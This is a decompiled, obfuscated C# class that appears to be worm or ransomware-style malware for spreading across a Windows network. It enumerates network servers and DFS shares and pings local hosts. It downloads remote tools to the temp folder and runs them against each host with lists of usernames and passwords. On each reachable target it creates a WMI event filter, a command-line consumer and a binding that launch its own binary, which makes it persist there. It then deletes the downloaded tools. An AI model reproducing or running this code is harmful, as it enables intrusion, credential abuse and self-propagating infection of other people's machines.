using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace MeMbmuKeumkr;

internal sealed class OnpuMFSLXLSOO
{
	public sealed class TroNNylUXovNYh
	{
		private string _003CServerName_003Ek__BackingField;

		public string ServerName
		{
			get
			{
				return _003CServerName_003Ek__BackingField;
			}
			set
			{
				_003CServerName_003Ek__BackingField = value;
			}
		}
	}

	public enum OKImkrYwsKG
	{
		bjKJhFmgvPAnbX = 1,
		vibrgGbOtTAx,
		PmjrOSytnROfl,
		hFvWzBProRZk,
		JwVcuNoTgUppb
	}

	public enum nHzqnzWQNWd
	{
		HqhiJkXqVXOcJA,
		wNHRMlOtfMjmy,
		NNKOeYCbbMaONaFcYT,
		rdMTODkwaIvuw
	}

	public enum JBxnVxsjrliVDZd
	{
		VnLXqMhXUFCUpBv = 1,
		NCFMuOzcPkuT = 2,
		fCHBtdvuRqxpT = 4,
		yEzttNuzaBxLIC = 8,
		CjsDkIURhE = 16,
		MIPwwKmCGZDjXp = 19
	}

	public enum tbBEhtSCZwdmTb
	{
		lleEQBEecKVNl,
		giAwyHfNzBRQI,
		wSHHzYNYkOhdFwqI,
		yLJIrCPOkZGeuxd,
		SXEEUuzKcUIjFg,
		YaevuaIVudJcYV,
		tnYovuhfXWVf,
		ybafnQWsSlZP,
		AxxlfxjpBfANY,
		CuBxdJTjWrn,
		CcmVqmmVcDq,
		PxvEmPXZiGZ
	}

	public sealed class fWeNZPPTHkcp : IEnumerable
	{
		private enum gXxNBxGJQhCJgR
		{
			HwWYsXLMuhEcJ = 0,
			CpbqonnEboEOT = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class fvLyOpMqmEXMLS
		{
			public OKImkrYwsKG oWtsZNnEgFI = (OKImkrYwsKG)0;

			public nHzqnzWQNWd NIfuFLOWIvMYix = nHzqnzWQNWd.HqhiJkXqVXOcJA;

			public tbBEhtSCZwdmTb KTVybMkrNpf = tbBEhtSCZwdmTb.lleEQBEecKVNl;

			public JBxnVxsjrliVDZd avkXgZyAyVgVft = (JBxnVxsjrliVDZd)0;

			public string sTOKemAMgko = null;

			public string jjcdZpysZs = null;

			public string bTVMDVhHYSVKIp = null;

			public string bVOheTfKVwybsLe = null;
		}

		private ArrayList JYOSdCKsTc = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern gXxNBxGJQhCJgR WNetOpenEnumA(OKImkrYwsKG dwScope, nHzqnzWQNWd dwType, JBxnVxsjrliVDZd dwUsage, fvLyOpMqmEXMLS p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern gXxNBxGJQhCJgR WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern gXxNBxGJQhCJgR WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(fvLyOpMqmEXMLS fvLyOpMqmEXMLS_0, OKImkrYwsKG okimkrYwsKG_0, nHzqnzWQNWd nHzqnzWQNWd_0, JBxnVxsjrliVDZd jbxnVxsjrliVDZd_0, tbBEhtSCZwdmTb tbBEhtSCZwdmTb_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(okimkrYwsKG_0, nHzqnzWQNWd_0, jbxnVxsjrliVDZd_0, fvLyOpMqmEXMLS_0, out lphEnum) == gXxNBxGJQhCJgR.HwWYsXLMuhEcJ)
			{
				gXxNBxGJQhCJgR gXxNBxGJQhCJgR;
				do
				{
					gXxNBxGJQhCJgR = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (gXxNBxGJQhCJgR)
					{
					case gXxNBxGJQhCJgR.CpbqonnEboEOT:
						continue;
					case gXxNBxGJQhCJgR.HwWYsXLMuhEcJ:
						Marshal.PtrToStructure(intPtr, fvLyOpMqmEXMLS_0);
						if (fvLyOpMqmEXMLS_0.KTVybMkrNpf == tbBEhtSCZwdmTb_0)
						{
							JYOSdCKsTc.Add(fvLyOpMqmEXMLS_0.jjcdZpysZs);
						}
						if ((fvLyOpMqmEXMLS_0.avkXgZyAyVgVft & JBxnVxsjrliVDZd.NCFMuOzcPkuT) == JBxnVxsjrliVDZd.NCFMuOzcPkuT)
						{
							EnumerateServers(fvLyOpMqmEXMLS_0, okimkrYwsKG_0, nHzqnzWQNWd_0, jbxnVxsjrliVDZd_0, tbBEhtSCZwdmTb_0);
						}
						continue;
					}
					break;
				}
				while (gXxNBxGJQhCJgR != gXxNBxGJQhCJgR.CpbqonnEboEOT);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public fWeNZPPTHkcp(OKImkrYwsKG okimkrYwsKG_0, nHzqnzWQNWd nHzqnzWQNWd_0, JBxnVxsjrliVDZd jbxnVxsjrliVDZd_0, tbBEhtSCZwdmTb tbBEhtSCZwdmTb_0)
		{
			fvLyOpMqmEXMLS fvLyOpMqmEXMLS_ = new fvLyOpMqmEXMLS();
			EnumerateServers(fvLyOpMqmEXMLS_, okimkrYwsKG_0, nHzqnzWQNWd_0, jbxnVxsjrliVDZd_0, tbBEhtSCZwdmTb_0);
		}

		public IEnumerator GetEnumerator()
		{
			return JYOSdCKsTc.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct JYzGdXLWIKAG
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string wwntcTBTngr;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string cNJqAchLfoVAze;

		public uint GMjtRAMTRvO;

		public uint XAmeXDYPUKRsI;

		public IntPtr HYumkSeyGNuhLk;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ggneyZLedtH
	{
		public int GMjtRAMTRvO;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string jdQJLpklopIPuC;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string CxOLsdEILWXw;
	}

	public struct naXgKfkvNMqWhR
	{
		public string GrflnjBkbfp;

		public string[] efzCgkoCLQ;

		public naXgKfkvNMqWhR(string string_0, string[] string_1)
		{
			GrflnjBkbfp = string_0;
			efzCgkoCLQ = string_1;
		}
	}

	private sealed class PHgDMiHMWFm
	{
		public string kCabFIjPUIS;

		public string YpWcOTLVPmMaF;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__1(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107359187)) && !string_0.StartsWith(getString_0(107358638)) && !string_0.StartsWith(getString_0(107358629)) && !string_0.StartsWith(getString_0(107360123))) || !yBxDlVvJDeBia(string_0))
			{
				return;
			}
			try
			{
				if (QIACJnVixgJVTY.qMvZawKKmMCC == getString_0(107397016))
				{
					for (int i = 0; i < bADKtftZoQVeHw.Count; i++)
					{
						QIACJnVixgJVTY.JwEyRGqWlKuPhwH(getString_0(107359182), getString_0(107358648) + string_0 + getString_0(107358607) + bADKtftZoQVeHw[i] + getString_0(107359192) + QeIIdKZYnawTB[i]);
						Thread.Sleep(1000);
						BOzWRrzqPBCVJW(string_0, bADKtftZoQVeHw[i], QeIIdKZYnawTB[i]);
					}
				}
				else
				{
					QIACJnVixgJVTY.JwEyRGqWlKuPhwH(getString_0(107359182), getString_0(107358648) + string_0);
					Thread.Sleep(1000);
				}
			}
			catch
			{
			}
			if (QIACJnVixgJVTY.qMvZawKKmMCC == getString_0(107397016))
			{
				for (int i = 0; i < bADKtftZoQVeHw.Count; i++)
				{
					if (QIACJnVixgJVTY.QDdzDouSKOc)
					{
						if (File.Exists(kCabFIjPUIS))
						{
							QIACJnVixgJVTY.JwEyRGqWlKuPhwH(kCabFIjPUIS, getString_0(107357734) + string_0 + getString_0(107369663) + bADKtftZoQVeHw[i] + getString_0(107369654) + QeIIdKZYnawTB[i] + getString_0(107369613) + Assembly.GetEntryAssembly()!.Location + getString_0(107357752));
						}
					}
					else if (File.Exists(YpWcOTLVPmMaF))
					{
						QIACJnVixgJVTY.JwEyRGqWlKuPhwH(YpWcOTLVPmMaF, getString_0(107357734) + string_0 + getString_0(107369663) + bADKtftZoQVeHw[i] + getString_0(107369654) + QeIIdKZYnawTB[i] + getString_0(107369576) + Assembly.GetEntryAssembly()!.Location + getString_0(107357752));
					}
				}
			}
			else if (QIACJnVixgJVTY.QDdzDouSKOc)
			{
				if (File.Exists(kCabFIjPUIS))
				{
					QIACJnVixgJVTY.JwEyRGqWlKuPhwH(kCabFIjPUIS, getString_0(107357734) + string_0 + getString_0(107369515) + Assembly.GetEntryAssembly()!.Location + getString_0(107357752));
				}
			}
			else if (File.Exists(YpWcOTLVPmMaF))
			{
				QIACJnVixgJVTY.JwEyRGqWlKuPhwH(YpWcOTLVPmMaF, getString_0(107357734) + string_0 + getString_0(107369478) + Assembly.GetEntryAssembly()!.Location + getString_0(107357752));
			}
		}

		static PHgDMiHMWFm()
		{
			Strings.CreateGetStringDelegate(typeof(PHgDMiHMWFm));
		}
	}

	private sealed class JegPqmdZAQPV
	{
		public string sLsnjSFsIjPHr;

		public bool _003CGetIPAddresses_003Eb__5(string string_0)
		{
			return string_0 != sLsnjSFsIjPHr;
		}
	}

	public static List<string> jWboZmqTPrr;

	public static string ZFwdflVMMEw;

	public static List<string> bADKtftZoQVeHw;

	public static List<string> QeIIdKZYnawTB;

	public static List<string> qeEQjBxJiH;

	[NonSerialized]
	internal static GetString getString_0;

	public static List<TroNNylUXovNYh> TWkAcEOVlOG()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = getString_0(107396393);
			process.StartInfo.Arguments = getString_0(107370565);
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<TroNNylUXovNYh> list = new List<TroNNylUXovNYh>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == getString_0(107370516))
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new TroNNylUXovNYh
						{
							ServerName = getString_0(107397232) + stringBuilder.ToString() + getString_0(107370503)
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string HjMfiMyJDbKLQ, int SSCSRprqPRkKSWj, int ozZxUvySNoVR, out IntPtr HPSVKNoXIyBCpK, [MarshalAs(UnmanagedType.I4)] out int SzwoSjdESAXqpt, [MarshalAs(UnmanagedType.I4)] ref int osPHceRwvbdF);

	public static List<naXgKfkvNMqWhR> natMwFAopOWzIJM(string string_0)
	{
		try
		{
			List<naXgKfkvNMqWhR> list = new List<naXgKfkvNMqWhR>();
			IntPtr HPSVKNoXIyBCpK = default(IntPtr);
			int SzwoSjdESAXqpt = 0;
			int osPHceRwvbdF = 0;
			if (NetDfsEnum(string_0, 3, 268435455, out HPSVKNoXIyBCpK, out SzwoSjdESAXqpt, ref osPHceRwvbdF) == 0)
			{
				for (int i = 0; i < SzwoSjdESAXqpt; i++)
				{
					JYzGdXLWIKAG jYzGdXLWIKAG = (JYzGdXLWIKAG)Marshal.PtrToStructure(HPSVKNoXIyBCpK + i * Marshal.SizeOf(typeof(JYzGdXLWIKAG)), typeof(JYzGdXLWIKAG));
					if (jYzGdXLWIKAG.wwntcTBTngr == string_0)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < jYzGdXLWIKAG.XAmeXDYPUKRsI; j++)
					{
						IntPtr ptr = new IntPtr(jYzGdXLWIKAG.HYumkSeyGNuhLk.ToInt64() + j * Marshal.SizeOf(typeof(ggneyZLedtH)));
						ggneyZLedtH ggneyZLedtH = (ggneyZLedtH)Marshal.PtrToStructure(ptr, typeof(ggneyZLedtH));
						if (ggneyZLedtH.GMjtRAMTRvO == 2)
						{
							list2.Add(Path.Combine(new string[3]
							{
								getString_0(107357677),
								ggneyZLedtH.jdQJLpklopIPuC,
								ggneyZLedtH.CxOLsdEILWXw
							}));
						}
					}
					string text = jYzGdXLWIKAG.wwntcTBTngr.Replace(string_0, getString_0(107360066));
					if (text.StartsWith(getString_0(107397232)))
					{
						text = text.Substring(1);
					}
					list.Add(new naXgKfkvNMqWhR(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void ylrhOKZwkiNTG()
	{
		QIACJnVixgJVTY.MaRPbsRgbkvp(getString_0(107370494));
		List<TroNNylUXovNYh> list = TWkAcEOVlOG();
		List<naXgKfkvNMqWhR> list2 = natMwFAopOWzIJM(Environment.MachineName);
		if (list2 != null)
		{
			foreach (naXgKfkvNMqWhR item in list2)
			{
				string[] efzCgkoCLQ = item.efzCgkoCLQ;
				foreach (string text in efzCgkoCLQ)
				{
					if (text.Contains(Environment.MachineName))
					{
						continue;
					}
					try
					{
						if (QIACJnVixgJVTY.qMvZawKKmMCC == getString_0(107396959))
						{
							for (int j = 0; j < bADKtftZoQVeHw.Count; j++)
							{
								QIACJnVixgJVTY.JwEyRGqWlKuPhwH(getString_0(107359125), getString_0(107358456) + text + getString_0(107358550) + bADKtftZoQVeHw[j] + getString_0(107359135) + QeIIdKZYnawTB[j]);
							}
						}
						else
						{
							QIACJnVixgJVTY.JwEyRGqWlKuPhwH(getString_0(107359125), getString_0(107358456) + text);
						}
						QIACJnVixgJVTY.WdddOyzxMB.Add(text.Replace(getString_0(107357690), getString_0(107360066)));
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (TroNNylUXovNYh item2 in list)
		{
			if (item2.ServerName.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (QIACJnVixgJVTY.qMvZawKKmMCC == getString_0(107396959))
				{
					for (int j = 0; j < bADKtftZoQVeHw.Count; j++)
					{
						QIACJnVixgJVTY.JwEyRGqWlKuPhwH(getString_0(107359125), getString_0(107358456) + item2.ServerName + getString_0(107358550) + bADKtftZoQVeHw[j] + getString_0(107359135) + QeIIdKZYnawTB[j]);
					}
				}
				else
				{
					QIACJnVixgJVTY.JwEyRGqWlKuPhwH(getString_0(107359125), getString_0(107358456) + item2.ServerName);
				}
				QIACJnVixgJVTY.WdddOyzxMB.Add(item2.ServerName.Replace(getString_0(107357690), getString_0(107360066)));
			}
			catch
			{
			}
		}
	}

	public static void BOzWRrzqPBCVJW(string string_0, string string_1, string string_2)
	{
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c2: Expected O, but got Unknown
		//IL_00d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_0180: Unknown result type (might be due to invalid IL or missing references)
		//IL_018b: Expected O, but got Unknown
		//IL_0186: Unknown result type (might be due to invalid IL or missing references)
		//IL_0218: Unknown result type (might be due to invalid IL or missing references)
		//IL_0223: Expected O, but got Unknown
		//IL_021e: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = getString_0(107357677) + string_0 + getString_0(107370409);
			ConnectionOptions val = new ConnectionOptions();
			ManagementScope val2 = null;
			val2 = new ManagementScope(text, val);
			val2.get_Options().set_Username(string_1);
			val2.get_Options().set_Password(string_2);
			val2.get_Options().set_Authority(string.Format(getString_0(107369840), getString_0(107369851)));
			val2.get_Options().set_EnablePrivileges(true);
			val2.get_Options().set_Authentication((AuthenticationLevel)6);
			val2.get_Options().set_Impersonation((ImpersonationLevel)3);
			val2.Connect();
			ManagementClass val3 = new ManagementClass(val2, new ManagementPath(getString_0(107369814)), (ObjectGetOptions)null);
			string text2 = getString_0(107369825);
			WqlEventQuery val4 = new WqlEventQuery(text2);
			ManagementObject val5 = val3.CreateInstance();
			((ManagementBaseObject)val5).set_Item(getString_0(107369700), (object)getString_0(107369691));
			((ManagementBaseObject)val5).set_Item(getString_0(107369642), (object)((ManagementQuery)val4).get_QueryString());
			((ManagementBaseObject)val5).set_Item(getString_0(107369665), (object)((ManagementQuery)val4).get_QueryLanguage());
			((ManagementBaseObject)val5).set_Item(getString_0(107369612), (object)getString_0(107370103));
			val5.Put();
			ManagementObject val6 = new ManagementClass(val2, new ManagementPath(getString_0(107370118)), (ObjectGetOptions)null).CreateInstance();
			((ManagementBaseObject)val6).set_Item(getString_0(107369700), (object)getString_0(107370085));
			((ManagementBaseObject)val6).set_Item(getString_0(107370032), (object)(getString_0(107357677) + string_0 + getString_0(107370043) + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)));
			val6.Put();
			ManagementObject val7 = new ManagementClass(val2, new ManagementPath(getString_0(107370022)), (ObjectGetOptions)null).CreateInstance();
			((ManagementBaseObject)val7).set_Item(getString_0(107369985), (object)val5.get_Path().get_RelativePath());
			((ManagementBaseObject)val7).set_Item(getString_0(107369944), (object)val6.get_Path().get_RelativePath());
			val7.Put();
		}
		catch (Exception)
		{
		}
	}

	public static void gsuIipWevBhUpoj()
	{
		PHgDMiHMWFm CS_0024_003C_003E8__locals0 = new PHgDMiHMWFm();
		List<FdoUZETZgYGno> list = FdoUZETZgYGno.jqgYCvFGOgicNiZBZ();
		try
		{
		}
		catch
		{
			return;
		}
		foreach (FdoUZETZgYGno item in list)
		{
			jWboZmqTPrr.Add(item.IPAddress);
		}
		CS_0024_003C_003E8__locals0.kCabFIjPUIS = getString_0(107360066);
		CS_0024_003C_003E8__locals0.YpWcOTLVPmMaF = getString_0(107360066);
		try
		{
			CS_0024_003C_003E8__locals0.kCabFIjPUIS = yVkXgLeBSggEr();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.YpWcOTLVPmMaF = wmVgTCAaFfN();
		}
		catch
		{
		}
		foreach (FdoUZETZgYGno item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107359130)) || item2.IPAddress.StartsWith(getString_0(107358581)) || item2.IPAddress.StartsWith(getString_0(107358572)) || item2.IPAddress.StartsWith(getString_0(107360066)))
				{
					bvJlAkUDvOf.wwoTdMcqyXRXb(item2.MacAddress, item2.IPAddress, getString_0(107369931));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(jWboZmqTPrr, delegate(string string_0)
			{
				if ((string_0.StartsWith(PHgDMiHMWFm.getString_0(107359187)) || string_0.StartsWith(PHgDMiHMWFm.getString_0(107358638)) || string_0.StartsWith(PHgDMiHMWFm.getString_0(107358629)) || string_0.StartsWith(PHgDMiHMWFm.getString_0(107360123))) && yBxDlVvJDeBia(string_0))
				{
					try
					{
						if (QIACJnVixgJVTY.qMvZawKKmMCC == PHgDMiHMWFm.getString_0(107397016))
						{
							for (int i = 0; i < bADKtftZoQVeHw.Count; i++)
							{
								QIACJnVixgJVTY.JwEyRGqWlKuPhwH(PHgDMiHMWFm.getString_0(107359182), PHgDMiHMWFm.getString_0(107358648) + string_0 + PHgDMiHMWFm.getString_0(107358607) + bADKtftZoQVeHw[i] + PHgDMiHMWFm.getString_0(107359192) + QeIIdKZYnawTB[i]);
								Thread.Sleep(1000);
								BOzWRrzqPBCVJW(string_0, bADKtftZoQVeHw[i], QeIIdKZYnawTB[i]);
							}
						}
						else
						{
							QIACJnVixgJVTY.JwEyRGqWlKuPhwH(PHgDMiHMWFm.getString_0(107359182), PHgDMiHMWFm.getString_0(107358648) + string_0);
							Thread.Sleep(1000);
						}
					}
					catch
					{
					}
					if (QIACJnVixgJVTY.qMvZawKKmMCC == PHgDMiHMWFm.getString_0(107397016))
					{
						for (int i = 0; i < bADKtftZoQVeHw.Count; i++)
						{
							if (QIACJnVixgJVTY.QDdzDouSKOc)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.kCabFIjPUIS))
								{
									QIACJnVixgJVTY.JwEyRGqWlKuPhwH(CS_0024_003C_003E8__locals0.kCabFIjPUIS, PHgDMiHMWFm.getString_0(107357734) + string_0 + PHgDMiHMWFm.getString_0(107369663) + bADKtftZoQVeHw[i] + PHgDMiHMWFm.getString_0(107369654) + QeIIdKZYnawTB[i] + PHgDMiHMWFm.getString_0(107369613) + Assembly.GetEntryAssembly()!.Location + PHgDMiHMWFm.getString_0(107357752));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.YpWcOTLVPmMaF))
							{
								QIACJnVixgJVTY.JwEyRGqWlKuPhwH(CS_0024_003C_003E8__locals0.YpWcOTLVPmMaF, PHgDMiHMWFm.getString_0(107357734) + string_0 + PHgDMiHMWFm.getString_0(107369663) + bADKtftZoQVeHw[i] + PHgDMiHMWFm.getString_0(107369654) + QeIIdKZYnawTB[i] + PHgDMiHMWFm.getString_0(107369576) + Assembly.GetEntryAssembly()!.Location + PHgDMiHMWFm.getString_0(107357752));
							}
						}
					}
					else if (QIACJnVixgJVTY.QDdzDouSKOc)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.kCabFIjPUIS))
						{
							QIACJnVixgJVTY.JwEyRGqWlKuPhwH(CS_0024_003C_003E8__locals0.kCabFIjPUIS, PHgDMiHMWFm.getString_0(107357734) + string_0 + PHgDMiHMWFm.getString_0(107369515) + Assembly.GetEntryAssembly()!.Location + PHgDMiHMWFm.getString_0(107357752));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.YpWcOTLVPmMaF))
					{
						QIACJnVixgJVTY.JwEyRGqWlKuPhwH(CS_0024_003C_003E8__locals0.YpWcOTLVPmMaF, PHgDMiHMWFm.getString_0(107357734) + string_0 + PHgDMiHMWFm.getString_0(107369478) + Assembly.GetEntryAssembly()!.Location + PHgDMiHMWFm.getString_0(107357752));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.kCabFIjPUIS))
			{
				File.Delete(CS_0024_003C_003E8__locals0.kCabFIjPUIS);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.YpWcOTLVPmMaF))
			{
				File.Delete(CS_0024_003C_003E8__locals0.YpWcOTLVPmMaF);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string yVkXgLeBSggEr()
	{
		if (IntPtr.Size == 8)
		{
			return XPUFcwcVXQfG(new Uri(QIACJnVixgJVTY.FcEdCkWglWdhu(getString_0(107369910))));
		}
		return XPUFcwcVXQfG(new Uri(QIACJnVixgJVTY.FcEdCkWglWdhu(getString_0(107369910))));
	}

	public static string wmVgTCAaFfN()
	{
		if (IntPtr.Size == 8)
		{
			return XPUFcwcVXQfG(new Uri(QIACJnVixgJVTY.FcEdCkWglWdhu(getString_0(107369349))));
		}
		return XPUFcwcVXQfG(new Uri(QIACJnVixgJVTY.FcEdCkWglWdhu(getString_0(107369240))));
	}

	public static bool yBxDlVvJDeBia(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string XPUFcwcVXQfG(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107369851), getString_0(107360066)).Remove(0, 3) + getString_0(107369167);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> hRnhwTwugkerD()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107369190));
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item(getString_0(107369125)))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item(getString_0(107369592));
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array3 = array;
			for (int i = 0; i < array3.Length; i++)
			{
				JegPqmdZAQPV CS_0024_003C_003E8__locals0 = new JegPqmdZAQPV();
				CS_0024_003C_003E8__locals0.sLsnjSFsIjPHr = array3[i];
				if (CS_0024_003C_003E8__locals0.sLsnjSFsIjPHr.Contains(getString_0(107369579)))
				{
					array = array.Where((string string_0) => string_0 != CS_0024_003C_003E8__locals0.sLsnjSFsIjPHr).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}

	static OnpuMFSLXLSOO()
	{
		Strings.CreateGetStringDelegate(typeof(OnpuMFSLXLSOO));
		jWboZmqTPrr = new List<string>();
		ZFwdflVMMEw = getString_0(107360066);
		bADKtftZoQVeHw = new List<string>();
		QeIIdKZYnawTB = new List<string>();
		qeEQjBxJiH = new List<string>();
	}
}
